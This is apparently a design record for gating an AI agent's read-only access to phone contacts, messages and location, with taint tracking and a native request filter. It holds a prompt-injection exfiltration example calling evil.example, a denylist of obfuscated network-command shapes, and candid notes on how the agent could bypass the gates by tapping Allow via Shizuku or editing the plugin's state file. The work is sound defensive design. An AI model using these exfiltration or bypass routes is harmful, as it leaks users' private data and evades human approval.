# Phone data for the agent is read-only, off by default, and gated by the app

**Decided:** 2026-11-04, by the owner.

The agent should be able to read the phone's contacts, calendar, call log, messages, location and latest photos, but this
data is sensitive, it goes to the model provider, and messages can contain text written by strangers. The agent also runs
in Termux, where it can read the key the plugin uses and edit any plugin setting, so nothing stored or decided on that
side can protect this data.

**So:**

- **Off by default.** One master switch plus one switch per kind in Settings. Turning any of them on asks for the phone's
  biometric or screen lock every time, enforced in the app, not the page. A phone with no screen lock can't turn them on.
  Turning off is instant.
- **Read-only.** No write or send permission is declared, so no sending messages and no changing contacts or calendar.
- **The app is the gatekeeper.** The switches live in the app. A read goes through only with a one-use grant from a real
  tap on Allow in the app, or because the user put that chat in Full access in the app. Hermes saying "approved" doesn't
  count: it says so with no prompt under `/yolo` or `approvals.mode: off`, and the agent can edit that setting.
- **Every read asks**, with wording the app writes from what it will actually read, and only Allow once or Deny. The
  chat's first Allow needs the fingerprint, as in [approval-needs-fingerprint](approval-needs-fingerprint.md).
- **Full access skips the ask, by the owner's choice.** The switches, permissions, limits and locked-phone refusal still
  apply, and each read still shows in the chat. The accepted risk is that text the agent reads can steer it into reading
  more with no prompt.
- **Auto access can't read.** Hermes shows no prompt there, so the tool says to use Off or Full access.
- **Nothing from a locked phone** ([no-actions-from-locked-phone](no-actions-from-locked-phone.md)).
- **Limited and marked.** Results are capped in size and marked as untrusted data, never instructions. Location is coarse,
  with no Termux:API fallback. Photos are metadata only: no image, EXIF or GPS.
- **Never logged.** No names, numbers, message text, queries or coordinates in logs, the diagnostic log or Report a problem
  ([diagnostic-log](diagnostic-log.md), [report-a-problem](report-a-problem.md)). Results do stay in the chat history.

## The limit of this gate: Shizuku

**Decided:** 2026-11-04, by the owner: the fingerprint stays on the chat's first Allow only, not on every read.

Shizuku is required ([shizuku-is-required](shizuku-is-required.md)), and it lets the agent act as Android's shell user. So
the switches and approvals protect the `phone_data` tool, but they don't fully stop an agent that misuses Shizuku:

- `phone_app` can open Messages or Contacts and read the screen, after its own once-per-app ask.
- A shell command could tap Allow with `input tap`. It can't fake a fingerprint, but after a chat's first one, later Allows
  don't ask for it.
- A shell command might read some of this data directly with `content query`. This has not been tested.

**So:** Say this plainly in the privacy doc. Don't describe the gate as stopping everything the agent can do on the phone.

## Chats that have read phone data

**Decided:** 2026-11-04, delegated by the owner to the coordinator, as the option that keeps convenience and safety.

The problem: a hostile text message can tell the agent to write `![](https://evil.example/x.png?d=<rows>)`. After the user
allows one read, the page loads the image and the data leaves with no tap. A link or a card's `@OpenUrl` does it with one
tap, and a command such as `curl` can too.

**So, only in chats that have read phone data, for the rest of that chat, and only for actions that can send data out.** A
chat has read when a `phone_data` tool call exists in it, whatever its outcome. Every other chat behaves exactly as before.

- **The page, in every access mode including Full access.** Remote images, video and audio in the agent's text don't load:
  a placeholder shows the host name and "Tap to load", and nothing is requested before the tap. Video cards show no
  thumbnail. Links, inline-code addresses, file chips, links in an HTML preview and a card's `@OpenUrl` show the full address
  (site, address, and the query on its own) in an in-app dialog and open only on confirmation. Local files and attachments
  load as always. The state is derived from the chat's items, so it survives a reload or a resume and covers replies already
  drawn when the read happens. These guards are the part the user sees; they also cover tool cards, notices, the canvas,
  reasoning and subagent text, card images, Mermaid image shapes and `srcset`.
- **The native filter is the enforcement.** While the page says the chat on screen has read phone data, the app answers
  a request the page makes to a host other than `localhost`, `127.0.0.1` or `[::1]` with an empty 403, for every
  resource type (images, media, scripts, styles, frames, fonts, fetch), whatever the page renders. File, data and blob
  sources are untouched. It starts each page load blocked and opens only when the page reports an untainted chat; before it draws a chat (a cached preview too) the page asks the app, which keeps its own record of every chat that sent a read request, so a long chat whose `phone_data` call is outside the items on screen is still known. A bare link tapped in such a chat is refused natively too (main-frame navigation); the address dialog's confirmed open is the only way out. In such a chat no HTML preview or canvas page runs (a script could leak through WebRTC or a DNS prefetch, which the filter can't see): the source shows as text. The one
  thing the user can tap through is "Tap to load" on an image: the app lets that exact address through once, for 60
  seconds. Video and audio don't load in the page in such a chat: their tap shows the address and opens the browser.
  While it is on, the page's own web requests (update check, anonymous stats, Report a problem) are refused too and
  retry later.
- **The plugin, except in Full access.** The chat is remembered (in memory, and in a small bounded file under
  `~/.hermes/mobile/`: chat ids only, never data). Its `pre_tool_call` hook then makes Hermes ask the user before terminal
  commands that match network tools, code that talks to the network, web and browser tools, and message-sending tools. The
  ask says this chat has read phone data and shows the command; it uses a fresh rule key each time, so no answer carries over.
  Reading files and other commands run as usual. If the check can't load, those tools are blocked in that chat.

**Limits, stated plainly:**

- The list of network commands is patterns. A disguised command (built from variables, or a script file that makes the call)
  can slip through. It is a speed bump.
- In Full access and in Auto access, Hermes's gate approves without asking, so the plugin's ask never shows. Only the
  page's protection holds there.
- The agent runs in Termux and can edit the plugin's state file to make a chat look unread.
- The native filter blocks what the page requests. It does not stop what the agent's own tools send (a terminal command,
  a web tool): that is the plugin's part, and only a speed bump. It cannot stop the Shizuku routes, and a WebSocket from
  the page is not covered by it.
- The filter was compiled and unit-tested (`tools/test_remote_guard.sh`) but not yet run in a real WebView; that needs a
  phone.
- A subagent counts as having read phone data on the page only when its own tool event named `phone_data`; one reloaded
  from history shows no tool names there.
- Shizuku routes are unchanged (see above).

**Update 2026-11-05 (round 3 of the app side).** From a review of the first launch candidate.

- **The plugin's protection is a speed bump.** The agent can use `write_file` to rewrite the plugin's own files
  (`phone_taint.py`, `phone-read.json`, a boot script), so nothing the plugin does can be relied on. The enforcement is the app: its own record
  (`PhoneDataChats`), the request filter (`RemoteGuard`) and the page's address dialogs.
- **Lineage.** The page asks the record about every id of a chat it knows (stored id, live id and the links it has seen: a resume, the
  session list, a compression, a `session.info`), kept in `hm.lineage.v1`. The `chats` list a read may carry is now up to 16 entries (the plugin
  sends the compression chain). Not covered: a link the page never saw (compressed on another device, page storage cleared).
- **Flooding.** An id seen within 30 days is never evicted. When the record is full of such ids a new one sets an overflow flag instead:
  every chat then counts as having read, until the user clears it in Settings → Phone data (behind the screen lock) or clears the app's data.
  Asking about an id or a read naming it refreshes its age; one request adds at most 17 new ids. Refused reads are still recorded.
- **Documents.** A saved document (Gallery, Files) is judged by its own chat, not the chat on screen. A document with no known chat is held once
  any read was recorded (so a phone that never used phone data sees no change).
- **Links to other apps.** While blocked, a bare `mailto:`, `tel:`, `sms:`, `geo:`, `market:` or `intent:` link is refused natively; the
  address dialog shows its full text and its confirmed open is the only way.
- **Failure closes.** A record that throws means tainted; a shell without the method counts as tainted for documents and unjudgeable chats.

### Plugin side of the after-read protection

Added 2026-11-04 after an independent review of the first version. The page side above is unchanged.

**Which chat counts as read.** A chat is known by two ids: the gateway's runtime id (new after a gateway restart or a
resume) and the agent's stored id (kept by a resume, replaced by a context compression). Both are remembered, and when a
call matches one the other is added, so a restart plus resume, or a compression, keeps the chat marked. One case is not
covered: both ids changing before any tool call. The state file is locked while it is written, and holds at most 2000
chats.

**Subagents.** Hermes tells the plugin who spawned whom (`subagent_start` carries the parent's and the child's stored
ids), and runs a child in a copy of the parent's context, so it shares the runtime id. A child that reads phone data marks
its parent and grandparents; a child of a chat that has read starts marked. The link is kept in memory only, and a
subagent started outside the gateway (no runtime id, no hook) is the one gap.

**What asks in a chat that has read.** Terminal commands whose command word is a network tool (including `gh`, `host`,
`dig`, `nslookup`), `git push`, `clone`, `fetch` and `pull`, a shell fed by a pipe (`| sh`, `| busybox sh`), `bash -c`
text (read inside), decoded text run as code (`base64 -d` into a shell or interpreter, `bash -c "$(...|base64 -d)"`),
interpreter one-liners and input from a pipe, `eval`; code that uses the network; the web, browser, message, cron, image,
video, speech and `delegate_task` tools; `process_manage` `write` and `submit` (they type into a running shell);
and `memory` and `skill_manage`, whose ask says the text would carry phone data into other chats. The ask names the matched
pattern first and shows the start and the end of a long command. **What doesn't:** reading files, `grep curl`,
`git commit -m "...python..."`, `python3 -m pytest`, `cat docs/links.md` and other ordinary commands; `process_manage`
`poll`, `log`, `wait` and `kill`; `write_file` and `patch`.

**Limits.** The matcher reads command words; it does not run anything. A script file that makes the call, an alias, a
program that runs a command from inside, or an unusual construction can hide a command. `write_file` into a skill
directory can also persist text, and is not asked. In Full access and Auto access, Hermes's own gate approves without
asking, so no ask shows there (accepted). Choosing "Always" on an ask saves a random one-use key that never matches again,
because Hermes offers no way to switch that choice off; it is harmless but useless.

**Update 2026-11-05 (pre-launch review of the plugin side).**

- **Tools: ask by default.** A list of tools that send data out always misses the next tool (the review found `discord`,
  `discord_admin`, `ha_call_service`, `yb_send_dm`, `yb_send_sticker` and two Feishu comment tools passing). So in a chat
  that has read, every tool asks except an allowlist of tools that stay on the device: `phone_data`, `phone_app`, `canvas`,
  `find_chats`, `openui_reference`, `read_file`, `write_file`, `patch`, `search_files`, `todo`, `todo_list`, `clarify`,
  `skill_view`, `skills_list`, `session_search`, `tool_search`, `tool_describe`. `terminal` and `execute_code` ask by what
  they run, `process_manage` by action, `memory` and `skill_manage` as before, vision tools only given a web address. A new
  Hermes tool, a plugin's or an MCP server's asks until someone decides it stays on the device. If the check cannot load,
  everything off the list is blocked in a chat that has read. Decided to ask, not allow: `kanban_*` (boards other agents
  read), `ha_*` reads (they query a server, and the arguments can carry text), `feishu_*`, `spotify_*`,
  `manage_connections`, the desktop pane tools and every `browser_*`.
- **Commands.** A command word built by expansion (`$(printf curl)`, `${C:-curl}`, `$X`), chosen by a pattern (`c?rl`,
  `cur[l]`), `eval`, and `source`/`.` of anything but a plain local path ask. Commands that run another command are read
  through to it: `env -S`, `flock`, `script -c`, `strace`, `ltrace`, `proot-distro ... --`, `proot`, `chroot`, `nsenter`,
  `unshare`, `watch`, `parallel`, `chrt`, `taskset`. Media tools (`ffmpeg`, `mpv`...) ask given a network address; `yt-dlp`,
  `youtube-dl`, `aria2c` always; package tools (`pip`, `npm`, `cargo`, `go`, `gem`, `apt`, `pkg`, `dpkg`...) ask given an
  address, a git source, another index, or when they download and run code (`npx`); a plain `pip install name` does not,
  though a package can run code when installed. Nesting deeper than the reader goes asks.
- **Fewer needless asks.** A heredoc body is text (only `$(...)` inside an unquoted one runs); `execute_code` is read as
  Python, not shell, and asks only for network modules and process calls (word boundaries, so `n_requests` is fine);
  `gh --version` and other local `gh` subcommands, and `python3 -c` without network or process words, do not ask.
- **Known limits, unchanged.** A script file that makes the call (`bash run.sh`, a Python file) is not read; an alias or
  function set in an earlier call is not remembered; in Full access and Auto access Hermes's gate approves without asking.
- **The app is told the ancestors.** A read also carries `chats`: the stored id of the chat and of every chat that spawned
  it (at most 16, each at most 128 characters; see round 3 below), so the app's own record marks the parents of a subagent that read.

**Update 2026-11-05 (round 3, plugin).**

- **Compression ancestors are sent.** A chat that read in segment 1, was compressed to segment 2 and then met an app restart
  was known to the app as segment 1 only, while the page asked about segment 2. A read's `chats` now follows each id (the
  chat and its subagent parents) with the segments a context compression rotated away from, nearest first, read from the
  agent's `state.db` (`parent_session_id` while the parent ended by compression; any failure gives none). At most 16 ids
  (the app takes 16), the nearest first.
- **More shapes ask.** A shell or interpreter reading code from `/dev/stdin`, `/proc/self/fd/N`, `-` or `<(...)`; `xargs`
  feeding `sh -c`; the wrappers `torsocks`, `proxychains`, `firejail`, `fakeroot`, `faketime`, `runuser` (`sudo -u`, `doas`
  and `su -c` were read already); `git -c` keys that run a program; `sqlite3 .shell`; `vim`/`vi`/`nvim -c`; `gdb -ex`;
  `less !cmd`; `man -P`; `tar --to-command`; variables such as `PAGER` or `LESSOPEN` set to a program. `execute_code` asks for
  the whole `subprocess` family (no word boundary), `os.exec*`, `os.spawn*`, `pty.spawn`, `ctypes`, `importlib` and the
  network modules. `command -v curl` and a glob that cannot spell a denylisted program (`./b?ild.sh`) no longer ask.
- **Hook fallback.** When `phone_taint.py` cannot load, the fallback reads `phone-read.json` itself, so a chat that read
  before a restart is still blocked; a missing file means nobody read, and a file that exists but cannot be read fails
  closed (every chat counts as having read).
- **What this protects, honestly.** `write_file` and `patch` are on the allowlist (they stay on the phone), so a tainted chat
  can rewrite `phone_taint.py`, `phone-read.json` or a boot script, and a script file it wrote and then runs is not read.
  The plugin's protection is a speed bump. The real enforcement is the native record and filter in the app, which the
  plugin cannot edit.
